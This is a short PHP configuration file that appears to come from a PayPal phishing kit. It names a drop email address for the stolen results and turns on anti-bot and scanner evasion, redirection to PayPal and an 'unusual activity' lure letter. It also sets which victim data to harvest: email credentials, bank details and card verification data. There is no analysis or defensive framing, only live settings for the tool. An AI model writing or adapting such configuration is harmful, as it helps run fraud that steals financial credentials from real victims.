<?php

$email = "darkbnk@yandex.com";

$redirect = "paypal";
$spox_protection = "yes";
$redirection = "yes";
$anti_bot = "yes";

$latter = "unusual_activity";  // unusual_activity & limited
$onetime = "yes";
$get_email = "yes";
$get_bank = "yes";
$get_photo = "no";
$get_vbv = "no";
$double_cc = "no";

$pinspox = "56326534156";

?>